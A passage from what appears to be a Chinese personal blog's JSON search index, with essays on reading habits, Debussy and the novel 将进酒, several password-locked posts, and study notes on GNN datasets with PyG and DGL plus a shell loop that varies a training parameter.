1911f5dfe1b00ce33c49e31fa1206944d40ae80913a28ab8623803388b11b8a108b5222ab1cb251fdaa</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-002","url":"/2023/02/12/%E9%9A%8F%E8%AE%B0-002/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-RIxKNUUJ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        思来想去，但头还是疼。上一篇关于献给阿尔吉侬的花束的读后感里我提到的第一点，关于文学作品应当连贯阅读这个观点我还是想深究一下。</p>\n<p>​        我并不想讨论有关作品本身引人入胜的程度，只针对我的话，我通常不会强迫自己看并不感兴趣的文学作品，本身就是一种放松，何必再折磨自己。</p>\n<p>​        对于我书单中的书籍都种类，我想大致把它们分为四种。一种是严肃小说（包括虚构和纪实），一种是科普性质的社科书籍（类似古典哲学和现代心理学，经济学理论之类的），一种是教科书（类似最近在看的那个证券投资考证书），最后就是纯垃圾食品类型的网络小说。</p>\n<p>​        这四种书中，通常也只有严肃小说最适合连贯的阅读，当然也没必要像我一样在一天之内看完，但至少这种剧情上的停顿越少越好。</p>\n<p>​        以下是原因。</p>\n<p>​        首先文艺小说与某些社科科普书的相同点在于他们内在想要表达的人生处世的观点也许是一致的，但科普书给出的“观点”高度概括且清晰直白，给人带来强烈的“说教感”且无法让人切实体会，当然优秀的科普书籍都会辅以简单清晰的例子，但是显然一个人无法因为一段百字的寓言故事就改头换面。科普书籍传达的观点通常能让人正确理解到位，但很难有动力去践行，就更别说因此而做出什么进步。心智成熟的过程必然要有对应的经历，道理是没有任何实际用处的。</p>\n<p>​        而文艺小说通常包含这种“经历”，作者用整个主人公的经历为读者提供了一个冗长而又深刻的“例子”，读者沉浸在故事中，很大程度上模拟了“经历”的行为，虽然并不是读者本人在做这些事，他们的出发点也与故事主角有着天壤之别，但一般来说只要读进去了通常从经历层面理解作者表达的用意不是一件难事。</p>\n<p>​        还是用献给阿尔吉侬的花束作为例子，作者想要传达给读者的一种重要观点是：“如果没有人性情感的调和，智慧与教育根本毫无价值。”</p>\n<p>​        想象一下，如果这句话出现在某本心理学的科普书中，作者在这个小节用黑体字加粗了这句话。</p>\n<p>​        <strong>“如果没有人性情感的调和，智慧与教育根本毫无价值。”</strong></p>\n<p>​        <strong>美国xxx大学心理学院xxx教授研究小组于xxxx年月日展开研究，该研究重大进展之一为通过手术使一名弱智成年人变成智商高达180的天才，然而研究小组遗憾地告诉我们，这名天才并不快乐，相反，他深刻地回忆起过去所遭受的痛苦与不公，并变得傲慢与无礼——很显然，这并不是一个合格的天才的行为，他的幼稚情感状态并无法适配他绝顶的智商”**</strong></p>\n<p>​        很显然，真正的科学家并不愿意用感性而诗意的语言————最重要的是足够能使读者共情的篇幅，去描述某个结论背后的经历，对于他们来说将结论公之于众，并让尽可能多的人知晓，这就足够了。</p>\n<p>​        所以这个重任留给了作家。作家可以用足够长，中篇，甚至长篇小说的篇幅，着重描写某一个或者多个观点。</p>\n<p>​        但这个观点显然不会像科普文章一样直白地以黑体加粗字呈现在目录中，更有可能的，一些佐证观点的剧情就像水滴石穿一样，隐秘地藏在行文中，当剧情达到某一个峰值时，作者一下把积累的所有伏笔抖落出来，暴露出其真正的目的，这一刻对于读者的冲击力是无以复加，回味无穷的。用一个不恰当的比喻来说，这是”先苦后甜“，读者永远不会预测到那些枯燥的描写实际上会在最后给他们带来多大的心理冲击，也不会预测到这个”峰值“何时来到。</p>\n<p>​        于是所有看似不重要的前文的剧情都无可忽略，那么如果我选择每周看一小时，一个月读完，很明显当我开启下一周的阅读时，上一周的细节已经忘得差不多了，我既然都选择了每周间断性阅读，这说明我的日常时间是紧张的，所以我更加不可能花时间去复习前文。这就造成了，我以为间隔的阅读是对于时间的精确管理，但它带给我的收益远小于连续阅读，理论上我花了相同的投入，但收益却不及原本的百分之五十（大概）。你也许要与我争论关于这两种安排的机会成本，那我更要说，相同的碎片时间，我可以拿来看教科书，科普书，或者背单词，这样这些事节省下来的时间足够我选择一周的某一天，完整畅快地读完一本小说，因此我甚至认为连续阅读的机会成本小于间断阅读。</p>\n<p>​        差不多就这些了，头没那么痛了，看电路了。</p>\n<p>​        附：垃圾食品小说无论怎么看都好，我一般吃饭的时候看，而且它也是连载，我想连着看都没法。但是不得不承认垃圾食品好吃，也确实解压。</p>\n<p>​        附：尽量避免在类似的随笔杂文中出现英文》〉》〉我现在已经隐隐有不分场合乱用英文单词的苗头了，比如“我并不想讨论有关作品本身引人入胜的程度”，我在打这句话的时候下意识地“作品本身compelling的程度”，我甚至想了一下才找到一个中文的同义词。但是这种表述我能感觉到来自于我对大脑的暗示，介于意识与潜意识之间，是非常危险的。还有昨天那个什么fans royalty，我又不是找不到中文同义词，学了几个破单词就来卖弄我是想干什么。来中文版图练英语吗？说英语的时候找不到英语用中文代替，能说中文的时候还故意说英文了，贱不贱啊，这么想精神美国人吗？</p>\n","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-003","url":"/2023/02/13/%E9%9A%8F%E8%AE%B0-003/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-HkuJjFif\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        很难想象为什么盗作中少年弹奏的乐曲是贝多芬的月光奏鸣曲而不是德彪西的月光。</p>\n<p>​        我爱这首曲子爱到死。</p>\n<p>​        之前在协会用音响放德彪西这个组曲，外面在下淅淅沥沥的雨，不大，衬得音响中的乐句越发宁静。</p>\n<p>​        那个时候我就在想，德彪西的钢琴和雨真的是绝配。</p>\n<p>​        后来我又试了很多组合，比如bwv键盘+雨，肖邦等浪漫派+雨，但就算是古尔德的钢琴作品配上雨声也不能说添色，浪漫主义则明显更适合饭店，最死亡的是bwv康塔塔+雨，有一种大白天打着黑伞在教堂前行礼的画面感。</p>\n<p>​        以及钢琴以外的任何音色都是违和的，尤其管弦乐，之前放bwv的时候一群人在那圣咏，画面就如刚刚所说充满了古怪的仪式感。</p>\n<p>​        羽管键琴同理，我到现在也无法发自内心欣赏这种几百年前的老祖宗，人们称颂它的声音古典而充满历史气息，我只觉得它刺耳。</p>\n<p>​        只有德彪西啊。我真想说：“德彪西！只有你是我的音乐啊！”</p>\n<p>​        笑。</p>\n<p>​        但是雨声白噪音配月光，或者德彪西任意一首和弦色彩很丰富而且感情很充沛的曲子的钢琴演奏版，都会极其舒适，我脑子画面大概是雨中园林一隅厅堂中，透过全景落地玻璃窗，能看到伫立在黑胡桃地板上纯黑亮漆的黑色施坦威大三角，弹奏者是谁我不会讲，于是音符隐隐约约从玻璃窗微小的空隙中溜出，有一种孤芳不自赏的美。</p>\n<p>​        当然这个园林是演奏者的，所以不仅画面美，金钱的香气也很甜美。</p>\n<p>​        当然还是人最美。</p>\n<p>​        下次试一下拉威尔，是不是印象派都挺配雨的。</p>\n<p>​        德彪西：？ ，只有谁是你的音乐？</p>\n<p>​        对了，mark一个质量很高的白噪音up主<a href=\"https://www.bilibili.com/video/BV1JD4y1P7no/?spm_id_from=333.880.my_history.page.click&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564。意境都是俺特别喜欢的，钟磬，木鱼，古寺的雨。\">https://www.bilibili.com/video/BV1JD4y1P7no/?spm_id_from=333.880.my_history.page.click&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564。意境都是俺特别喜欢的，钟磬，木鱼，古寺的雨。</a></p>\n<p>​        不过带木鱼和钟声的定位就是纯学习白噪音，因为如果放歌的话节奏会乱，睡觉的话又太吵。（都试过了，昨天那个钟给我吓了好几次</p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-004","url":"/2023/02/13/%E9%9A%8F%E8%AE%B0-004/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"e41a18dc3a613c614f7ffb645c39b821f783b97e853a0933abedd49b9fbadc70\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-005","url":"/2023/02/16/%E9%9A%8F%E8%AE%B0-005/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-fUggmeLM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        早上看下饭菜的时候无意间看到一个张艺谋和陈其钢吵架的视频，原来是08年奥运会主题曲演唱者被张艺谋临时决定从年轻学生换成大牌明星后告知陈，但陈不能理解并拒绝引发的矛盾。我看完只觉得这是两种完全不同的观念，似乎也没有高低之分，然而弹幕清一色支持张，认为其有大局观，格局高远，陈则是私心太重，将个人艺术表达效果至于国家影响之上。</p>\n<p>​        我个人看张艺谋的电影很少，也是由于此人近年拍的商业电影丑各种丑闻满天飞，才对其几乎没有了解的情况下印象居然并不佳，不过之前看独立电影人的时候才知道张艺谋以前也是拍独立电影起家的，所以尚有些许改观。</p>\n<p>​        但是我绝对是对陈其钢老师及其作品有着百分百的喜爱与敬重的，所以看到这个视频的时候我第一反应是站在陈老师这一边。</p>\n<p>​        但关掉视频，我还是忍不住回想这个事情。</p>\n<p>​        纯粹的家国大义固然值得歌颂，然而“心远地自偏”的境界也不容小觑。试问张艺谋换人这件事的东西，百分之百是为了国家形象吗？如果年轻学生出了什么问题，或者国家领导人认为这首歌曲的演奏无法完美地表现形象，作为总导演的张艺谋当然需要负大部分责任。所以这一番话真的出自其真心所想吗？未必。陈其钢选择年轻学生，就全然不顾所谓的形象了吗?为什么年轻学生所表达的就一定不如明星大腕？难道不能做到两全其美吗？不过我对这件事情也没有具体的了解，也不想了解，只是完全根据这个吵架的视频发表评论。</p>\n<p>​        当然若要不讨论这些比较复杂的因素，单纯论“入仕”与“出世”，我能想到的例子只存在于小说。</p>\n<p>​        现在回想起来，将进酒中有一个令我印象极为深刻的剧情，就是姚元琢投靠沈泽川之后，召集各方文人行清谈会。当元琢昭告天下自己已经入仕，一个老头说：“臭！臭不可闻？俗不可耐。”</p>\n<p>​        具体的对话已经记不清了，大致是老头劝说元琢当个自由小神仙，为什么要跳入那泥潭，染得自己一生污。元琢说，为了苍生百姓，大周有难，我得明主，为何不入。</p>\n<p>​        老头并没有错，大周已是烂泥一股，病入膏肓，与其行杯水车薪之事，不如遗世独立，化清风一缕飘散山间。</p>\n<p>​        就算大周当值盛世，入仕也只不过是追名逐利之举，灭苦唯有禁欲，官场沉浮永无终结，璞玉最终也要蒙灰。</p>\n<p>​        但姚元琢的境高于任何人，明知大周无药可救，却只身赴火，曾经的他也是逍遥小仙，酿泉为酒，曲径通幽，人神合并，无欲无求。入仕后的姚温玉依旧没变，他不是为了自身名利而入仕，而是为了苍生百姓，因为沈泽川，他寻到了大周的“解”，因此毅然投入政事，可以说是将自己的一条命，都交付给了大周百姓。</p>\n<p>​        当然这也是基于种种因素之下的选择，普通人无法学，也学不来， 没有沈泽川，没有因薛修卓而失的双腿和寿命，姚温玉大概会隐居一辈子吧。说来也又意思，真正成为皇帝的沈泽川，或是差点成为皇帝的李剑霆，倒是所有主角中最接近普通人的，他们成为皇帝前一大半的三分之二的人生的度过都与普通人无异，一番成就完全取决于纯后天的努力。可能这也是t97想表达的某种隐秘的观点吧，翻越那座山，任何人都能够成为自己想要成为的人（（（虽然兰舟也不是想当皇帝就是了。</p>\n<p>​        笑死了，将进酒里面大段大段关于人物心理变化的描写，我以前怎么就没有看懂呢？这个小说我看是剧情也复杂，人物也复杂，以前只觉得剧情架构庞大，现在看来还是我太嫩了，t97深不可测啊，20岁的心境真的能写出这种小说吗？</p>\n<p>​        害，将进酒要挤掉犯罪心理和破云荣登“我最爱的男童小说榜”第一名了。（为什么破云能排前三，实在是我太喜欢江停这个角色了。江停+天空声音加持我没有办法不爱屋及乌，大言不惭地说我看了七年南通小说，江停是我唯一的全是私人感情的偏爱，但不是梦女的那种，，，可能就是我梦想中的完美人生吧，就是也是有为了正义与家国大业牺牲自己的思想觉悟，但是活得很通透也很懂得享受生活不会被尘世的欲望困扰，有自己热爱的事业和一些小爱好，例如下象棋喝茶看书，还没有生活压力，因为对象是前首富的儿子，因此可以喝几十万一饼的普洱茶饼（xmsl）（（（（（（（（（（（（（，谁要当原耽男主的梦女啊，和男人抢男人orz，刚刚想了一下江停是俺对象的样子，有点冷汗都下来了，差不多就是杨媚代入吧。我抄我终于明白杨梅这个角色存在的意义了，所有想当江停梦女的妹子们只要代入一下杨梅就彻底死心了，杨梅存在就是为了消除所有江停梦女好维持岩浆cp！！！！！）</p>\n<p>​        顺带一提，今天的下饭菜是普契尼的波西米亚人（艺术家的生涯）。这个剧的原声带我之前已经听过好多遍了，只不过意大利语苦手，确实不知道讲啥。今天一看，好家伙，充满生活气息，果然是rent的蓝本。</p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-006","url":"/2021/01/01/%E9%9A%8F%E8%AE%B0-006/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"bbe1ec4110cbe18a754d80108d8d932519ef8a274c26b17b0abfd12db70687b8\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["进步报告"]},{"title":"随记-007","url":"/2023/03/10/%E9%9A%8F%E8%AE%B0-007/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"94db370585cfd2f58528997eaef1dbec69473ad6c5aaa96bfa5ea1bbc62d46b7\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["进步报告"]},{"title":"Graph data processing","url":"/2023/09/06/Graph%20data%20processing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p>——&gt;图神经网络数据处理指(bi)南(ji)</p>\n<p><a href=\"https://chenglu.me/blogs/torch-geometric-dataset\">https://chenglu.me/blogs/torch-geometric-dataset</a></p>\n\n    <div id=\"aplayer-AMRImiyo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h1><span id=\"0-graph基础\">0 graph基础</span></h1><h2><span id=\"01-graph常见表示方式\">0.1 graph常见表示方式</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%207.46.55%20PM.png\" alt=\"Screen Shot 2023-09-07 at 7.46.55 PM\"></p>\n<p>**节点对</p>\n<p><strong>邻接列表</strong><br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%207.55.53%20PM.png\" alt=\"Screen Shot 2023-09-07 at 7.55.53 PM\"><br><strong>邻接矩阵</strong></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%207.51.00%20PM.png\" alt=\"Screen Shot 2023-09-07 at 7.51.00 PM\"></p>\n<h1><span id=\"1-常见数据集\">1 常见数据集</span></h1><p><a href=\"https://blog.csdn.net/w55100/article/details/115911550\">https://blog.csdn.net/w55100/article/details/115911550</a></p>\n<p><a href=\"https://blog.csdn.net/u010159842/article/details/103348257?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-103348257-blog-115911550.235%5Ev38%5Epc_relevant_default_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-103348257-blog-115911550.235%5Ev38%5Epc_relevant_default_base\">https://blog.csdn.net/u010159842/article/details/103348257?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-103348257-blog-115911550.235%5Ev38%5Epc_relevant_default_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-103348257-blog-115911550.235%5Ev38%5Epc_relevant_default_base</a><br>这两篇博客各自整理了常见的图神经网络中使用的数据集。</p>\n<h2><span id=\"11-cora\">1.1 Cora</span></h2><p>我接触到第一个图数据集，目前见到的常见的样子就是<code>cora.npz</code><br>，实际上就是七个数组的np压缩版本。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%204.50.10%20PM.png\" alt=\"Screen Shot 2023-09-07 at 4.50.10 PM\"></p>\n<p>还有另外一个版本，就是利用<code>planetoid</code>方法下载下来的数据集，大致会有<br>这么八个文件：<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%205.16.42%20PM.png\" alt=\"Screen Shot 2023-09-07 at 5.16.42 PM\"><br>处理之后就是生成一个pyg可以识别的对象文件。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-07%20at%205.39.56%20PM.png\" alt=\"Screen Shot 2023-09-07 at 5.39.56 PM\"></p>\n<h1><span id=\"2-常见框架\">2 常见框架</span></h1><p><a href=\"https://zhuanlan.zhihu.com/p/115342917\">https://zhuanlan.zhihu.com/p/115342917</a></p>\n<h2><span id=\"21-pyg\">2.1 PyG</span></h2><h3><span id=\"data类\">data类</span></h3><p><a href=\"https://xdocs.dgl.ai/en/0.8.x/guide_cn/data-process.html\">官方文档</a><br>[教程？](<a href=\"https://chenglu.me/blogs/torch-geometric-dataset\">https://chenglu.me/blogs/torch-geometric-dataset</a></p>\n<p>在PyG中，单个graph定义为<code>torch_geometric.data.Data</code>实例，默认有以下属性：</p>\n<ul>\n<li><p><code>data.x</code>：节点特征矩阵，shape为<code>[num_nodes, num_node_features]</code>。</p>\n</li>\n<li><p><code>data.edge_index</code>：COO格式的graph connectivity矩阵，shape为<code>[2, num_edges]</code>，类型为<code>torch.long</code></p>\n</li>\n<li><p><code>data.edge_attr</code>：边的特征矩阵，shape为<code>[num_edges, num_edge_features]</code>。</p>\n</li>\n<li><p><code>data.y</code>：训练的target，shape不固定，比如，对于node-level任务，形状为<code>[num_nodes, *]</code>，对于graph-level任务，形状为<code>[1, *]</code></p>\n</li>\n<li><p><code>data.pos</code>：节点的位置(position)矩阵，shape为<code>[num_nodes, num_dimensions]</code>。</p>\n</li>\n</ul>\n<p>以数据集cora为例<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">dataset = Planetoid(root=<span class=\"string\">&#x27;/tmp/Cora&#x27;</span>, name=<span class=\"string\">&#x27;Cora&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-08%20at%204.54.24%20PM.png\" alt=\"Screen Shot 2023-09-08 at 4.54.24 PM\"><br><code>data set</code>的一些属性如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-08%20at%204.54.42%20PM.png\" alt=\"Screen Shot 2023-09-08 at 4.54.42 PM\"></p>\n<h3><span id=\"数据增强\">数据增强</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">dataset = Planetoid(root=<span class=\"string\">&#x27;./data/&#x27;</span>, \\</span><br><span class=\"line\"></span><br><span class=\"line\">name=args.dataset</span><br><span class=\"line\"></span><br><span class=\"line\">transform=transform)</span><br></pre></td></tr></table></figure>\n<p>参数中设置开启transform，则可以自动对数据集进行变换/增强。</p>\n<h3><span id=\"batch\">Batch</span></h3><p>图有一个特性，如果节点之间没有连接，则它们不会相互传递消息。因此可以直接将几个图堆叠成一个超图（HyperGraph），而这个超图中的每个小图就像一座孤岛，彼此之间没有连接关系。因为堆叠起来的大图仍然是一张「图」，在结构上可以直接用于所有图模型，因此在模型层面也无需做任何改动。<br><code>torch_geometric.loader.DataLoader</code> 会自动完成上述的 batching 操作。</p>\n<h2><span id=\"22-dgl\">2.2 DGL</span></h2><p>因为目前在看的一个项目用的是dgl，所以咱们暂时先深入研究一下dgl好了。<br>从官方文档开始。<br><a href=\"https://docs.dgl.ai\">https://docs.dgl.ai</a></p>\n<h3><span id=\"221-构建dglgraph\">2.2.1 构建DGLgraph</span></h3><h4><span id=\"利用tensor构建\">利用tensor构建</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u, v = th.tensor([<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>]), th.tensor([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>])</span><br><span class=\"line\">g = dgl.graph((u, v))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-08%20at%205.21.09%20PM.png\" alt=\"Screen Shot 2023-09-08 at 5.21.09 PM\"></p>\n<p>边分别是：<br>[0-&gt;1],[0-&gt;2],[0-&gt;3],[1-&gt;3] x2</p>\n<h4><span id=\"利用scipy稀疏矩阵构建\">利用SciPy稀疏矩阵构建</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> dgl</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> th</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> scipy.sparse <span class=\"keyword\">as</span> sp</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>spmat = sp.rand(<span class=\"number\">100</span>, <span class=\"number\">100</span>, density=<span class=\"number\">0.05</span>) <span class=\"comment\"># 5%非零项</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>dgl.from_scipy(spmat)                   <span class=\"comment\"># 来自SciPy</span></span><br><span class=\"line\">Graph(num_nodes=<span class=\"number\">100</span>, num_edges=<span class=\"number\">500</span>,</span><br><span class=\"line\">      ndata_schemes=&#123;&#125;</span><br><span class=\"line\">      edata_schemes=&#123;&#125;)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"利用networkx构建\">利用Networkx构建</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>nx_g = nx.path_graph(<span class=\"number\">5</span>) <span class=\"comment\"># 一条链路0-1-2-3-4</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>dgl.from_networkx(nx_g) <span class=\"comment\"># 来自NetworkX</span></span><br><span class=\"line\">Graph(num_nodes=<span class=\"number\">5</span>, num_edges=<span class=\"number\">8</span>,</span><br><span class=\"line\">      ndata_schemes=&#123;&#125;</span><br><span class=\"line\">      edata_schemes=&#123;&#125;)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"从磁盘加载\">从磁盘加载</span></h4><p>常见可加载格式：<br>CSV<br>JSON<br>DGL二进制格式</p>\n<h3><span id=\"222-graph-data-概述\">2.2.2 Graph data 概述</span></h3><p><code>g.nodes()</code></p>\n<p>获取节点ID</p>\n<p><code>g.edges()</code><br>获取边对应的端点</p>\n<h1><span id=\"reference\"># reference</span></h1><h3><span id=\"图数据概览\">图数据概览</span></h3><p><a href=\"https://www.epubit.com/courseDetails?id=PCC72369cd0eb9e7\">https://www.epubit.com/courseDetails?id=PCC72369cd0eb9e7</a> 视频网课</p>\n<h3><span id=\"pyg教程\">PyG教程</span></h3><p><a href=\"https://zhuanlan.zhihu.com/p/78452993\"># 番外篇：PyG框架及Cora数据集简介</a></p>\n","categories":["ML"],"tags":["GNN"]},{"title":"shell脚本实现改变参数多次运行python文件","url":"/2023/09/24/shell%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E6%94%B9%E5%8F%98%E5%8F%82%E6%95%B0%E5%A4%9A%E6%AC%A1%E8%BF%90%E8%A1%8Cpython%E6%96%87%E4%BB%B6/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>其实就是blog好久没更新了水一下博客。<br>我的需求是每次跑的时候改变trigger的值，从0到200，每次加10.<br>这个是比较粗糙（可解释性高）的版本，直接写一个for循环，然后在cmd规定参数值时用 <code>$xxx</code> 代替</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (( trigger_number=<span class=\"number\">0</span>; trigger_number&lt;=<span class=\"number\">200</span>; trigger_number+=<span class=\"number\">10</span> ))</span><br><span class=\"line\"></span><br><span class=\"line\">do</span><br><span class=\"line\"></span><br><span class=\"line\">python train_teacher.py --exp_setting tran --teacher GCN --dataset cora --opt p --trigger_number $trigger_number --trigger_class <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">python train_student.py --exp_setting tran --teacher GCN --student MLP --dataset cora --out_t_path outputs --data c --opt p --trigger_number $trigger_number --trigger_class <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span 